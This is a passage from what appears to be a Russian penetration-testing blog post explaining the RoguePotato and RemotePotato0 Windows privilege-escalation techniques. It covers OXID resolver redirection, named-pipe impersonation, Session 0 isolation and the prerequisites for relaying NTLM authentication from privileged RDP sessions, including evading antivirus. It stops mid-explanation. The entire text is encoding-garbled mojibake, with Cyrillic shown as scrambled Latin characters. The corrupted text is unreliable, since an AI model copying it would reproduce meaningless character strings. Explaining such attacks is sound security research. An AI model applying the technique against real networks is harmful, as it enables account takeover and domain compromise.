1. –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø–æ–¥–Ω–∏–º–∞–µ—Ç –∫–∞—Å—Ç–æ–º–Ω—ã–π —Å–µ—Ä–≤–∏—Å OXID (Object Exporter ID) Resolver **–Ω–∞ –ª–æ–∫–∞–ª—å–Ω–æ–º –ø–æ—Ä—Ç—É** –∞—Ç–∞–∫—É–µ–º–æ–π –º–∞—à–∏–Ω—ã, –æ—Ç–ª–∏—á–Ω–æ–º –æ—Ç 135/TCP. OXID-—Ä–µ–∑–æ–ª–≤–µ—Ä –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ Windows –¥–ª—è —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–∞ –≤—ã–∑—ã–≤–∞–µ–º–æ–≥–æ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ RPC (–≤ –Ω–∞—à–µ–º —Å–ª—É—á–∞–µ –ø–æ–¥–∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–≥–æ –∞—Ç—Ç–∞–∫–µ—Ä—É) –≤ –µ–≥–æ –∏–º—è, —Ç. –µ. –≤ —Å—Ç—Ä–æ–∫—É RPC-–±–∏–Ω–¥–∏–Ω–≥–∞.
2. –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≥–æ–≤–æ—Ä–∏—Ç —Å–ª—É–∂–±–µ DCOM/RPC –º–∞—à–∏–Ω—ã-–∂–µ—Ä—Ç–≤—ã –ø–æ—Å—Ç—É—á–∞—Ç—å—Å—è **–Ω–∞ —É–¥–∞–ª–µ–Ω–Ω—ã–π IP-–∞–¥—Ä–µ—Å** (–∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ—Ç—Å—è –∞—Ç–∞–∫—É—é—â–∏–º) –¥–ª—è —Ä–µ–∑–æ–ª–≤–∞ —Ç–æ–π —Å–∞–º–æ–π OXID-–∑–∞–ø–∏—Å–∏. –≠—Ç–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤ —Å–∏–ª—É —Ç–æ–≥–æ, —á—Ç–æ Microsoft –∑–∞–ø—Ä–µ—Ç–∏–ª–∏ –æ–±—Ä–∞—â–µ–Ω–∏–µ –∫ –ª–æ–∫–∞–ª—å–Ω—ã–º OXID-—Ä–µ–∑–æ–ª–≤–µ—Ä–∞–º, —Å–ª—É—à–∞—é—â–∏–º –ù–ï –Ω–∞ –ø–æ—Ä—Ç—É 135/TCP.
3. –ù–∞ —Ç–æ–º —Å–∞–º–æ–º **—É–¥–∞–ª–µ–Ω–Ω–æ–º IP-–∞–¥—Ä–µ—Å–µ** –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø–æ–¥–Ω–∏–º–∞–µ—Ç `socat` (–∏–ª–∏ –ª—é–±–æ–π –¥—Ä—É–≥–æ–π TCP-—Ä–µ–¥–∏—Ä–µ–∫—Ç–æ—Ä) –Ω–∞ –ø–æ—Ä—Ç—É 135/TCP –∏ ¬´–∑–µ—Ä–∫–∞–ª–∏—Ç¬ª –ø—Ä–∏—à–µ–¥—à–∏–π OXID-–∑–∞–ø—Ä–æ—Å –Ω–∞ –∞—Ç–∞–∫—É–µ–º—É—é –º–∞—à–∏–Ω—É –≤ –ø–æ—Ä—Ç, –Ω–∞ –∫–æ—Ç–æ—Ä–æ–º —Å–ª—É—à–∞–µ—Ç –∫–∞—Å—Ç–æ–º–Ω—ã–π —Å–µ—Ä–≤–∏—Å OXID Resolver –∏–∑ —à–∞–≥–∞ 1. –ü–æ—Å–ª–µ–¥–Ω–∏–π —Ä–µ–∑–æ–ª–≤–∏—Ç –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–π –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä –≤ —Å—Ç—Ä–∏–Ω–≥—É RPC-–±–∏–Ω–¥–∏–Ω–≥–∞ –∏–º–µ–Ω–Ω–æ–≤–∞–Ω–Ω–æ–≥–æ –∫–∞–Ω–∞–ª–∞ `ncacn_np:localhost/pipe/RoguePotato[\pipe\epmapper]`.
4. –î–∞–ª–µ–µ –º–∞—à–∏–Ω–∞-–∂–µ—Ä—Ç–≤–∞ –Ω–∞–∫–æ–Ω–µ—Ü-—Ç–æ –¥–µ–ª–∞–µ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π RPC-–≤—ã–∑–æ–≤ (API-—Ä—É—á–∫–∞ `IRemUnkown2`) —Å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ–º –∫ –ø–æ–¥–∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–º—É –∞—Ç–∞–∫—É—é—â–µ–º—É –ø–∞–π–ø—É –∏–∑ —à–∞–≥–∞ 3, —á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –Ω–∞–º –æ–ª–∏—Ü–µ—Ç–≤–æ—Ä–∏—Ç—å –ø–æ–¥–∫–ª—é—á–∏–≤—à–µ–≥–æ—Å—è –∫–ª–∏–µ–Ω—Ç–∞ —Å –ø–æ–º–æ—â—å—é `RpcImpersonateClient`, –∫–∞–∫ —ç—Ç–æ –æ–ø–∏—Å–∞–ª [@itm4n](https://twitter.com/itm4n) –≤ —Å—É–¥—å–±–æ–Ω–æ—Å–Ω–æ–º —Ä–µ—Å–µ—Ä—á–µ [PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/).

[![–ú–µ—Ö–∞–Ω–∏–∑–º —Ä–∞–±–æ—Ç—ã RoguePotato (–∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ ‚Äì jlajara.gitlab.io)](/assets/images/remote-potato-0/roguepotato-scheme.png)](/assets/images/remote-potato-0/roguepotato-scheme.png)
{:.center-image}

–ú–µ—Ö–∞–Ω–∏–∑–º —Ä–∞–±–æ—Ç—ã RoguePotato (–∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ ‚Äì jlajara.gitlab.io)
{:.quote}

–° –±–∞–∑–æ–≤–æ–π —Ç–µ–æ—Ä–∏–µ–π –∑–∞–∫–æ–Ω—á–∏–ª–∏.

–•–æ—Ä–æ—à–∏–π —Ç–∞–º–ª–∞–π–Ω —Å –∫—Ä–∞—Ç–∫–∏–º –æ–ø–∏—Å–∞–Ω–∏–µ–º –≤—Å–µ—Ö ¬´–∫–∞—Ä—Ç–æ—à–µ–∫¬ª –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ: https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html.

# RemotePotato0

## –í–≤–µ–¥–µ–Ω–∏–µ

[RemotePotato0](https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/) ‚Äì —É—Å–ø–µ—à–Ω—ã–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç –ø–æ–ø—ã—Ç–∫–∏ —Ä–∞—Å—à–∏—Ä–∏—Ç—å –æ–±–ª–∞—Å—Ç—å –ø—Ä–∏–º–µ–Ω–µ–Ω–∏—è RoguePotato –¥–ª—è –ø—Ä–æ–≤–µ–¥–µ–Ω–∏—è –∞—Ç–∞–∫ –Ω–∞ –¥–æ–º–µ–Ω–Ω—ã–µ —É—á–µ—Ç–Ω—ã–µ –∑–∞–ø–∏—Å–∏.

–†–∞–±–æ—Ç–∞–µ—Ç —ç—Ç–æ –¥–µ–ª–æ –ø—Ä–∏–º–µ—Ä–Ω–æ —Ç–∞–∫ –∂–µ, –∫–∞–∫ –∏ RoguePotato, –∑–∞ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ–º —Ç–æ–≥–æ, —á—Ç–æ —Ç–µ–ø–µ—Ä—å –º—ã –∏—Å–ø–æ–ª—å–∑—É–µ–º –¥—Ä—É–≥–∏–µ —Å–ª—É–∂–±—ã (—Å –¥—Ä—É–≥–∏–º–∏ –∑–Ω–∞—á–µ–Ω–∏—è–º–∏ CLSID) –¥–ª—è —Ç—Ä–∏–≥–≥–µ—Ä–∞ NTLM-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π, —Å–µ—Å—Å–∏–∏ –∫–æ—Ç–æ—Ä—ã—Ö —Å—É—â–µ—Å—Ç–≤—É—é—Ç –Ω–∞ –∞—Ç–∞–∫—É–µ–º–æ–π –º–∞—à–∏–Ω–µ –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ —Å –Ω–∞—à–µ–π. –ü–µ—Ä–≤–æ–Ω–∞—á–∞–ª—å–Ω—ã–π –≤–∞—Ä–∏–∞–Ω—Ç —ç–∫—Å–ø–ª–æ–∏—Ç–∞ —Ä–∞–±–æ—Ç–∞–ª —Ç–æ–ª—å–∫–æ –ø—Ä–∏ —É—Å–ª–æ–≤–∏–∏ –¥–µ–π—Å—Ç–≤–∏—è –∞—Ç–∞–∫—É—é—â–µ–≥–æ –∏–∑ —Ç–∞–∫ –Ω–∞–∑—ã–≤–∞–µ–º–æ–≥–æ ¬´–Ω—É–ª–µ–≤–æ–≥–æ —Å–µ–∞–Ω—Å–∞¬ª.

Session 0 Isolation ‚Äì –∫–æ–Ω—Ü–µ–ø—Ü–∏—è —Ä–∞–∑–¥–µ–ª–µ–Ω–∏—è —Å–µ—Å—Å–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –æ—Ç —Å–µ—Å—Å–∏–π —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Å–ª—É–∂–± –∏ –Ω–µ–∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π. –ù–∞—á–∏–Ω–∞—è —Å Windows Vista, –≤—Å–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –ø–æ–¥–∫–ª—é—á–∞—è—Å—å –Ω–∞ –º–∞—à–∏–Ω—É —É–¥–∞–ª–µ–Ω–Ω–æ –ø–æ –ø—Ä–æ—Ç–æ–∫–æ–ª—É RDP, –ø—Ä–æ–≤–∞–ª–∏–≤–∞—é—Ç—Å—è –≤ —Å–≤–æ—é —Å–µ—Å—Å–∏—é, –æ—Ç–∫—É–¥–∞ –Ω–µ –º–æ–≥—É—Ç –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å —Å –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏, –∑–∞–ø—É—â–µ–Ω–Ω—ã–º–∏ –≤ –¥—Ä—É–≥–∏—Ö —Å–µ—Å—Å–∏—è—Ö, –µ—Å–ª–∏ –Ω–µ –æ–±–ª–∞–¥–∞—é—Ç –ø—Ä–∞–≤–∞–º–∏ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞. –û–¥–Ω–∞–∫–æ, –µ—Å–ª–∏ ¬´–ø–æ–ª—å–∑—é–∫¬ª –ø–æ–¥–∫–ª—é—á–µ–Ω —á–µ—Ä–µ–∑ —Å–ª—É–∂–±—É WinRM (Windows Remote Management, 5985-5986/TCP) –∏–ª–∏ SSH, —Ç–æ –æ–Ω –ø—Ä–æ–≤–∞–ª–∏–≤–∞–µ—Ç—Å—è –Ω–µ–ø–æ—Å—Ä–µ–¥—Å—Ç–≤–µ–Ω–Ω–æ –≤ –Ω—É–ª–µ–≤–æ–π —Å–µ–∞–Ω—Å, —Ç. –∫. —Å–∞–º–∏ –≤—ã—à–µ—É–∫–∞–∑–∞–Ω–Ω—ã–µ —Å–ª—É–∂–±—ã —Å—É—â–µ—Å—Ç–≤—É—é—Ç –∏–º–µ–Ω–Ω–æ —Ç–∞–º.

–ù–∞–≥–ª—è–¥–Ω—ã–π –ø—Ä–∏–º–µ—Ä: –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å `TINYCORP\j.doe` –≤ –º–æ–µ–π –ª–∞–±–µ –Ω–µ –∏–º–µ–µ—Ç –ø—Ä–∞–≤ –ª–æ–∫–∞–ª–∞–¥–º–∏–Ω–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ TEXAS, –ø–æ—ç—Ç–æ–º—É –Ω–µ –º–æ–∂–µ—Ç –≤–∏–¥–µ—Ç—å –∑–∞–ø—É—â–µ–Ω–Ω—ã—Ö –æ—Ç –∏–º–µ–Ω–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ Google Chrome, –±—É–¥—É—á–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã–º –ø–æ RDP. –û–¥–Ω–∞–∫–æ, –µ—Å–ª–∏ –æ—Ç–∫—Ä—ã—Ç—å –¥–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞, —ç—Ç–∏ –ø—Ä–æ—Ü–µ—Å—Å—ã –±—É–¥—É—Ç –æ—Ç–æ–±—Ä–∞–∂–µ–Ω—ã.

[![–ó–∞–ø—É—Å–∫ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞ –∑–∞–¥–∞—á —Å —Ä–∞–∑–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏](/assets/images/remote-potato-0/taskmgr-sessions.png)](/assets/images/remote-potato-0/taskmgr-sessions.png)
{:.center-image}

–ó–∞–ø—É—Å–∫ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞ –∑–∞–¥–∞—á —Å —Ä–∞–∑–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏
{:.quote}

–° –¥—Ä—É–≥–æ–π —Å—Ç–æ—Ä–æ–Ω—ã, –µ—Å–ª–∏ —è –≤–∫–ª—é—á—É —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ –ª–æ–∫–∞–ª—å–Ω—É—é –≥—Ä—É–ø–ø—É **Remote Management Users** –Ω–∞ —ç—Ç–æ–º —Å–µ—Ä–≤–µ—Ä–µ –∏ –ø–æ–¥–∫–ª—é—á—É—Å—å –∫ –Ω–µ–º—É —Å –ø–æ–º–æ—â—å—é [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), —è –æ–∫–∞–∂—É—Å—å –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ Session 0, –ø–æ-–ø—Ä–µ–∂–Ω–µ–º—É –Ω–µ –æ–±–ª–∞–¥–∞—è –ø—Ä–∞–≤–∞–º–∏ –ª–æ–∫–∞–ª–∞–¥–º–∏–Ω–∞.

[![–í–Ω—É—Ç—Ä–∏ –Ω—É–ª–µ–≤–æ–≥–æ —Å–µ–∞–Ω—Å–∞ –ø–æ WinRM](/assets/images/remote-potato-0/evil-winrm-session.png)](/assets/images/remote-potato-0/evil-winrm-session.png)
{:.center-image}

–í–Ω—É—Ç—Ä–∏ –Ω—É–ª–µ–≤–æ–≥–æ —Å–µ–∞–Ω—Å–∞ –ø–æ WinRM
{:.quote}

–≠—Ç–æ –Ω–µ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ —è —Ç–µ–ø–µ—Ä—å –º–æ–≥—É –¥–µ–ª–∞—Ç—å —Å –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏ –≤ –¥—Ä—É–≥–∏—Ö —Å–µ—Å—Å–∏—è—Ö –≤—Å–µ, —á—Ç–æ –∑–∞—Ö–æ—á—É, –æ–¥–Ω–∞–∫–æ –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã–µ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å –Ω–∏–º–∏ —á–µ—Ä–µ–∑ DCOM/RPC.

–¢–æ –µ—Å—Ç—å –≤ —Å–∏—Ç—É–∞—Ü–∏–∏, –∫–æ–≥–¥–∞ —É –Ω–∞—Å –µ—Å—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å –ø—Ä–∞–≤–∞–º–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ —Å–µ—Ä–≤–µ—Ä–∞–º –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ –Ω—É–ª–µ–≤–æ–≥–æ —Å–µ–∞–Ω—Å–∞ –ø–æ—Å—Ä–µ–¥—Å—Ç–≤–æ–º WinRM –∏/–∏–ª–∏ SSH (—Ç. –µ. –≤—Ö–æ–¥—è—â–∏–π –≤ –≥—Ä—É–ø–ø—É Remote Management Users), –Ω–æ –Ω–µ –æ–±–ª–∞–¥–∞—é—â–∏–π –ø—Ä–∞–≤–∞–º–∏ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ (–≤ –ø—Ä–æ—Ç–∏–≤–Ω–æ–º —Å–ª—É—á–∞–µ [–º—ã –º–æ–∂–µ–º –ø—Ä–æ—Å—Ç–æ —Å–¥–∞–º–ø–∏—Ç—å LSASS](https://habr.com/ru/company/angarasecurity/blog/661341/) –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –Ω—É–∂–Ω—ã—Ö –∫—Ä–µ–¥), –º–æ–∂–Ω–æ –±—ã–ª–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ç—Ä—é–∫ —Å RemotePotato0 –ø—Ä–∏ —É—Å–ª–æ–≤–∏–∏ —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏—è –Ω–∞ –∞—Ç–∞–∫—É–µ–º–æ–º —Å–µ—Ä–≤–µ—Ä–µ —Å–µ—Å—Å–∏–π –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π. –ü–æ —Å–ª–æ–≤–∞–º –∞–≤—Ç–æ—Ä–∞ —ç–∫—Å–ø–ª–æ–∏—Ç–∞ –≤ —ç—Ç–æ–º —Å–ª—É—á–∞–µ –ø—Ä–∏ —Ç—Ä–∏–≥–≥–µ—Ä–µ NTLM-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ —á–µ—Ä–µ–∑ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–π CLSID –º—ã —Å–º–æ–∂–µ–º —É–≥–Ω–∞—Ç—å –∫–æ–Ω—Ç–µ–∫—Å—Ç —Å–µ—Å—Å–∏–∏ **—Å –Ω–∞–∏–º–µ–Ω—å—à–∏–º –∑–Ω–∞—á–µ–Ω–∏–µ–º –µ–µ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–∞**:

> *"If we have a shell in Session 0, even as a low privileged user, and trigger these particular CLSIDs, we will obtain an NTLM authentication from the user who is interactively connected (if more than one user is interactively connected, we will get that of the user with lowest session id)"*, –∏—Å—Ç–æ—á–Ω–∏–∫ ‚Äì https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/

–ü–æ–Ω—è—Ç–Ω–æ, —á—Ç–æ –ø—Ä–∏ —Ç–∞–∫–æ–º —Ä–∞—Å–∫–ª–∞–¥–µ –æ–±–ª–∞—Å—Ç—å –ø—Ä–∏–º–µ–Ω–∏–º–æ—Å—Ç–∏ RemotePotato0 –±—ã–ª–∞ –Ω–µ –æ—á–µ–Ω—å —à–∏—Ä–æ–∫–æ–π, –ø–æ—ç—Ç–æ–º—É —Ö–∞–π–ø–∞ –≤–æ–∫—Ä—É–≥ —ç—Ç–æ–≥–æ –º–µ—Ç–æ–¥–∞ –±—ã–ª–æ –Ω–µ–º–Ω–æ–≥–æ.

–°–ø—É—Å—Ç—è –Ω–µ–∫–æ—Ç–æ—Ä–æ–µ –≤—Ä–µ–º—è –Ω–∞ –≤—Å–µ–æ–±—â—É—é —Ä–∞–¥–æ—Å—Ç—å —ç–∫—Å–ø–ª–æ–∏—Ç [–æ–±–Ω–æ–≤–∏–ª—Å—è](https://twitter.com/decoder_it/status/1419403714222301186) –∏ —Å—Ç–∞–ª –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª **–∫—Ä–æ—Å—Å-—Å–µ—Å—Å–∏–æ–Ω–Ω–æ–≥–æ** —Ç—Ä–∏–≥–≥–µ—Ä–∞ NTLM-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏: —ç—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –¥–µ–π—Å—Ç–≤—É—è –¥–∞–∂–µ –≤ —Ä–∞–º–∫–∞—Ö —Å–µ—Å—Å–∏–∏ ‚Ññ 1 –∏–∑ RDP, –º—ã –º–æ–∂–µ–º –¥–µ—Ä–Ω—É—Ç—å –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∫–æ–Ω—Ç–µ–∫—Å—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞, —Ç–∞–∫–∂–µ –∑–∞–ª–æ–≥–∏–Ω–µ–Ω–Ω–æ–≥–æ –≤ RDP, –Ω–æ –≤ —Å–µ—Å—Å–∏–∏ ‚Ññ 2.

–ò –≤–æ—Ç —ç—Ç–æ —É–∂–µ –±—ã–ª–æ –ø—Ä—è–º –ø—É—à–∫–æ–π!

## –ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç –∏ –∫–æ–≥–¥–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å

–ü–µ—Ä–µ–¥ –ø–µ—Ä–µ—Ö–æ–¥–æ–º –∫ –ø—Ä–∞–∫—Ç–∏–∫–µ —Å—É–º–º–∏—Ä—É–µ–º –Ω–∞—à–∏ –∑–Ω–∞–Ω–∏—è –æ RemotePotato0.

–£—Å–ª–æ–≤–∏—è –ø—Ä–∏–º–µ–Ω–∏–º–æ—Å—Ç–∏ –∞—Ç–∞–∫–∏, –∏–ª–∏ —á–µ–º –Ω–∞–º –Ω—É–∂–Ω–æ –æ–±–ª–∞–¥–∞—Ç—å:

1. –°–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –¥–æ–º–µ–Ω–Ω–∞—è –£–ó, –∏–º–µ—é—â–∞—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ —É–¥–∞–ª–µ–Ω–Ω–æ–º—É —Å–µ—Ä–≤–µ—Ä—É –ø–æ –ø—Ä–æ—Ç–æ–∫–æ–ª—É RDP, –≥–¥–µ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ –º–æ–≥—É—Ç —Ç—É—Å–∏—Ç—å –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏. –ù–∞ —Å–∞–º–æ–º –¥–µ–ª–µ, —ç—Ç–æ —É—Å–ª–æ–≤–∏–µ –≤—Å—Ç—Ä–µ—á–∞–µ—Ç—Å—è –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏ –≤–µ–∑–¥–µ, —Ç. –∫. –≤–µ–∑–¥–µ –µ—Å—Ç—å —Ç–µ—Ä–º–∏–Ω–∞–ª—å–Ω–∏–∫–∏, –∫—É–¥–∞ –≤—Ä–µ–º—è –æ—Ç –≤—Ä–µ–º–µ–Ω–∏ –∑–∞–≥–ª—è–¥—ã–≤–∞—é—Ç –¥–æ–º–µ–Ω–∞–¥–º–∏–Ω—ã.
2. –ü–æ–¥–∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–π –∞—Ç–∞–∫—É—é—â–µ–º—É —Ö–æ—Å—Ç –≤ –∏–Ω—Ç—Ä–∞–Ω–µ—Ç–µ, –∏–º–µ—é—â–∏–π —Å–µ—Ç–µ–≤—É—é —Å–≤—è–∑–∞–Ω–Ω–æ—Å—Ç—å –ø–æ –ø–æ—Ä—Ç—É 135/TCP —Å –∞—Ç–∞–∫—É–µ–º—ã–º —Å–µ—Ä–≤–µ—Ä–æ–º (–æ—Ç —ç—Ç–æ–≥–æ —É—Å–ª–æ–≤–∏—è –º—ã –∏–∑–±–∞–≤–∏–º—Å—è –¥–∞–ª–µ–µ).
3. –ù–µ–∑–∞—â–∏—â–µ–Ω–Ω—ã–π —ç–Ω–¥–ø–æ–∏–Ω—Ç —Å –¥–æ–º–µ–Ω–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–µ–π, –∫—É–¥–∞ –º–æ–∂–Ω–æ —Ä–µ–ª–µ–∏—Ç—å Net-NTLMv2 –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é, –ø—Ä–∏–ª–µ—Ç–µ–≤—à—É—é –Ω–∞ –Ω–∞—à HTTP-—Å–µ—Ä–≤–µ—Ä. –ò–¥–µ–∞–ª—å–Ω—ã–π –≤–∞—Ä–∏–∞–Ω—Ç ‚Äì —Å–ª—É–∂–±—ã LDAP(S) –∏–ª–∏ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–µ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∫–æ—Ä–ø–æ—Ä–∞—Ç–≤–Ω–æ–≥–æ —Ü–µ–Ω—Ç—Ä–∞ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ Microsoft AD CS.
4. –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∏—Å–ø–æ–ª–Ω–µ–Ω–∏—è —ç–∫—Å–ø–ª–æ–∏—Ç–∞ RemotePotato0 –Ω–∞ –∞—Ç–∞–∫—É–µ–º–æ–º —Å–µ—Ä–≤–µ—Ä–µ –≤ –æ–±—Ö–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω–æ–π –∑–∞—â–∏—Ç—ã.

–ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç –∞—Ç–∞–∫–∞:

1. –î–µ–π—Å—Ç–≤—É—è –∏–∑ —Å–µ—Å—Å–∏–∏ –Ω–µ–ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω–æ–≥–æ –ø–æ RDP –∫ —Å–µ—Ä–≤–µ—Ä—É, –≥–¥–µ –µ—Å—Ç—å —Å–µ—Å—Å–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ (–∏–ª–∏ –ª—é–±–æ–≥–æ –¥—Ä—É–≥–æ–≥–æ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–µ–≥–æ –Ω–∞—Å) –¥–æ–º–µ–Ω–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∞—Ç–∞–∫—É—é—â–∏–π —Ç—Ä–∏–≥–≥–µ—Ä–∏—Ç NTLM-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é –æ—Ç –∏–º–µ–Ω–∏ –∂–µ—Ä—Ç–≤—ã —á–µ—Ä–µ–∑ –∞–Ω–º–∞—Ä—à–∞–ª–∏–Ω–≥ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –æ–±—ä–µ–∫—Ç–∞ COM-–∫–ª–∞—Å—Å–∞ `IStorage` –ø–æ—Å—Ä–µ–¥—Å—Ç–≤–æ–º –ø–µ—Ä–µ–¥–∞—á–∏ –µ–≥–æ –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∞—Ä–≥—É–º–µ–Ω—Ç–∞ –≤ API-—Ä—É—á–∫—É `CoGetInstanceFromIStorage`. –í –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–º –æ–±—ä–µ–∫—Ç–µ –∂–∏–≤–µ—Ç IP-–∞–¥—Ä–µ—Å –∏ –ø–æ—Ä—Ç –ø–æ–¥–∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–≥–æ –∞—Ç–∞–∫—É—é—â–µ–º—É —Å–µ—Ç–µ–≤–æ–≥–æ —É–∑–ª–∞, –∫—É–¥–∞ –ø–æ–∑–∂–µ –ø—Ä–∏–ª–µ—Ç–∏—Ç NTLM-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è.
